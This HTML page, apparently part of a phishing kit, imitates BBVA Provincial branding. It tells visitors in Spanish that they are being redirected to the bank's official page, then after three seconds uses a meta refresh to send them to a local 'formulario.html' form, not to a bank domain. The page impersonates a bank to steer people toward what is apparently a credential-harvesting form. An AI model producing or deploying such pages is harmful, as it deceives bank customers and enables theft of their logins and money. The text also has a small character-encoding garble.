<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Redirigiendo...</title>
  <style>
    body {
      margin: 0;
      background-color: #0b2545;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .card-container {
      position: relative;
      margin-bottom: 30px;
    }

    .card {
      width: 120px;
      height: 80px;
      background: linear-gradient(135deg, #0050b3, #003b75);
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0, 123, 255, 0.6);
      animation: pulse 2s infinite;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: bold;
    }

    .dot {
      position: absolute;
      right: -10px;
      bottom: -10px;
      width: 15px;
      height: 15px;
      background-color: #2ee626;
      border-radius: 50%;
      box-shadow: 0 0 10px #2ee626;
    }

    @keyframes pulse {
      0% {
        box-shadow: 0 0 15px rgba(0, 123, 255, 0.5);
        transform: scale(1);
      }
      50% {
        box-shadow: 0 0 30px rgba(0, 123, 255, 0.9);
        transform: scale(1.05);
      }
      100% {
        box-shadow: 0 0 15px rgba(0, 123, 255, 0.5);
        transform: scale(1);
      }
    }

    .text {
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="card-container">
    <div class="card">BBVA</div>
    <div class="dot"></div>
  </div>
  <div class="text">Redirigiendo a la p√°gina oficial BBVA Provincial...</div>
  <meta http-equiv="refresh" content="3;url=formulario.html">
</body>
</html>
